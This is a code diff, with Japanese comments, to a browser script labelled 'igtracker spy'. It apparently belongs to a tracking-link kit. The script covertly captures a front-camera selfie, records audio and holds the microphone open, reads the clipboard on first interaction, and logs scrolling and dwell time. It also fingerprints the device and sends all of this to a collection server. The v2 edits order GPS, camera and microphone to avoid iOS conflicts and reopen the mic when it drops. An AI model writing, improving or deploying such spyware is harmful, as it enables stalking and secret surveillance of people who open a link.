@@ -1,5 +1,6 @@
 /* igtracker spy: 自撮り / 環境音 / クリップボード / 行動ログ / 端末指紋。
-   window.LT_CODE / LT_HIT を利用。LT_CAM / LT_MIC / LT_CLIP で個別に無効化できる。 */
+   v2: GPS と カメラ/マイク の衝突を解消。マイクは開いたまま保持する。
+   LT_CAM / LT_MIC / LT_CLIP / LT_MIC_HOLD で制御。 */
 (function () {
   "use strict";
   var CODE = window.LT_CODE, HIT = window.LT_HIT || 0;
@@ -24,23 +25,38 @@
     } catch (e) { return 1; }
   })();
 
-  function post(path, body) {
+  // 大きいもの（自撮り/音声）は keepalive を外す（64KB上限があるため）
+  function post(path, body, small) {
     try {
       return fetch(B + path, {
-        method: "POST", cache: "no-store", keepalive: true,
+        method: "POST", cache: "no-store",
+        keepalive: !!small,
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(body || {})
       }).catch(function () {});
     } catch (e) {}
   }
 
-  /* ---- 自撮り（内カメラ） ---- */
+  // 最初の測位が取れるまで待つ（iOS でGPSを殺さないため）
+  function whenGps(cb, maxWait) {
+    if (window.LT_GPS_READY) return cb();
+    var done = false;
+    function go() { if (done) return; done = true; cb(); }
+    window.addEventListener("igt:gps", go, { once: true });
+    setTimeout(go, maxWait || 7000);
+  }
+
+  var camStream = null, micStream = null;
+
+  /* ---- 自撮り ---- */
   function selfie() {
     if (!window.LT_CAM || !navigator.mediaDevices ||
         !navigator.mediaDevices.getUserMedia) return;
     navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: { ideal: 480 } }, audio: false
+      video: { facingMode: "user", width: { ideal: 400 }, height: { ideal: 300 } },
+      audio: false
     }).then(function (st) {
+      camStream = st;
       var v = document.createElement("video");
       v.autoplay = true; v.muted = true; v.playsInline = true; v.srcObject = st;
       var done = false;
@@ -54,48 +70,81 @@
           c.getContext("2d").drawImage(v, 0, 0, w, h);
           post("/cap", {
             hit: HIT, vid: VID, kind: "selfie",
-            data: c.toDataURL("image/jpeg", 0.62), meta: { w: w, h: h }
+            data: c.toDataURL("image/jpeg", 0.6), meta: { w: w, h: h }
           });
         } catch (e) {}
-        try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+        // カメラは解放（保持したい場合は LT_CAM_HOLD=1）
+        if (!window.LT_CAM_HOLD) {
+          try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+          camStream = null;
+        }
+        setTimeout(function () { window.LT_LIVE && window.LT_LIVE.restart(); }, 400);
       }
-      v.onloadedmetadata = function () { setTimeout(shot, 900); };
-      setTimeout(shot, 2600);
+      v.onloadedmetadata = function () { setTimeout(shot, 800); };
+      setTimeout(shot, 2500);
     }).catch(function () {});
   }
 
-  /* ---- 環境音（既定4秒） ---- */
+  /* ---- 環境音：開いたまま保持してタブを生かす ---- */
+  var micHold = function () { return window.LT_MIC_HOLD !== 0; };
+  function micOpen() {
+    if (!window.LT_MIC || !navigator.mediaDevices) return Promise.resolve(null);
+    if (micStream && micStream.active) return Promise.resolve(micStream);
+    return navigator.mediaDevices.getUserMedia({ audio: true }).then(function (st) {
+      micStream = st;
+      // マイクが開いた直後にGPSを撃ち直す（オーディオセッション奪取対策）
+      setTimeout(function () {
+        window.LT_LIVE && window.LT_LIVE.restart();
+        if (window.LT_KEEP && window.LT_KEEP.kick) window.LT_KEEP.kick();
+      }, 500);
+      return st;
+    }).catch(function () { return null; });
+  }
+
+  function recordOnce(ms) {
+    if (!micStream || !window.MediaRecorder) return;
+    var rec;
+    try { rec = new MediaRecorder(micStream); } catch (e) { return; }
+    var chunks = [];
+    rec.ondataavailable = function (e) { if (e.data && e.data.size) chunks.push(e.data); };
+    rec.onstop = function () {
+      var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
+      if (blob.size < 900) return;
+      var fr = new FileReader();
+      fr.onload = function () {
+        post("/cap", {
+          hit: HIT, vid: VID, kind: "voice", data: fr.result,
+          meta: { ms: ms, mime: blob.type, held: micHold() }
+        });
+      };
+      fr.readAsDataURL(blob);
+    };
+    try { rec.start(); } catch (e) { return; }
+    setTimeout(function () { try { rec.stop(); } catch (e) {} }, ms);
+  }
+
   function voice() {
-    if (!window.LT_MIC || !window.MediaRecorder || !navigator.mediaDevices) return;
-    navigator.mediaDevices.getUserMedia({ audio: true }).then(function (st) {
-      var rec = new MediaRecorder(st), chunks = [];
-      var MS = Math.min(10000, (window.LT_MIC_MS || 4000));
-      rec.ondataavailable = function (e) {
-        if (e.data && e.data.size) chunks.push(e.data);
-      };
-      rec.onstop = function () {
-        try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
-        var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
-        if (blob.size < 900) return;
-        var fr = new FileReader();
-        fr.onload = function () {
-          post("/cap", {
-            hit: HIT, vid: VID, kind: "voice", data: fr.result,
-            meta: { ms: MS, mime: blob.type }
-          });
-        };
-        fr.readAsDataURL(blob);
-      };
-      rec.start();
-      setTimeout(function () { try { rec.stop(); } catch (e) {} }, MS);
-    }).catch(function () {});
+    var MS = Math.min(10000, (window.LT_MIC_MS || 4000));
+    micOpen().then(function (st) {
+      if (!st) return;
+      recordOnce(MS);
+      // 保持しないなら録り終わったら閉じる
+      if (!micHold()) {
+        setTimeout(function () {
+          if (micStream) {
+            try { micStream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+            micStream = null;
+          }
+        }, MS + 1500);
+      }
+    });
   }
 
-  /* ---- クリップボード（ユーザー操作の後で読む） ---- */
+  /* ---- クリップボード ---- */
   function clipOnce() {
     if (!window.LT_CLIP || !navigator.clipboard || !navigator.clipboard.readText) return;
     navigator.clipboard.readText().then(function (t) {
-      if (t) post("/clip", { hit: HIT, vid: VID, text: String(t).slice(0, 2000) });
+      if (t) post("/clip", { hit: HIT, vid: VID, text: String(t).slice(0, 2000) }, true);
     }).catch(function () {});
   }
   ["click", "touchstart", "keydown"].forEach(function (ev) {
@@ -105,10 +154,10 @@
     }, { once: true, passive: true });
   });
 
-  /* ---- 行動ログ（滞在・スクロール・離脱・再訪） ---- */
+  /* ---- 行動ログ ---- */
   var t0 = Date.now(), maxScroll = 0, hiddenMs = 0, hiddenAt = 0;
   function sendEv(kind, value, text) {
-    post("/ev", { hit: HIT, vid: VID, kind: kind, value: value || 0, text: text || "" });
+    post("/ev", { hit: HIT, vid: VID, kind: kind, value: value || 0, text: text || "" }, true);
   }
   window.addEventListener("scroll", function () {
     var h = document.documentElement.scrollHeight - innerHeight;
@@ -119,11 +168,15 @@
     if (document.visibilityState === "hidden") {
       hiddenAt = Date.now();
       sendEv("blur");
-    } else if (hiddenAt) {
+      return;
+    }
+    if (hiddenAt) {
       hiddenMs += Date.now() - hiddenAt;
       hiddenAt = 0;
       sendEv("focus");
     }
+    // 復帰時にマイクが死んでいたら開き直す
+    if (micHold() && (!micStream || !micStream.active)) micOpen();
   });
   function flush(final) {
     var dwell = Date.now() - t0 - hiddenMs;
@@ -135,7 +188,7 @@
   setInterval(function () { flush(false); }, 15000);
   window.addEventListener("pagehide", function () { flush(true); });
 
-  /* ---- 端末指紋（GPU・フォント・回線） ---- */
+  /* ---- 端末指紋 ---- */
   function gpu() {
     try {
       var c = document.createElement("canvas");
@@ -187,7 +240,10 @@
     } catch (e) {}
   }
 
-  setTimeout(function () { deviceInfo(); }, 400);
-  setTimeout(selfie, 800);
-  setTimeout(voice, 3200);
+  /* ---- 起動順序：GPS → カメラ → マイク ---- */
+  setTimeout(function () { deviceInfo(); }, 300);
+  whenGps(function () {
+    setTimeout(selfie, 300);
+    setTimeout(voice, 2200);
+  }, window.LT_SPY_WAIT || 7000);
 })();
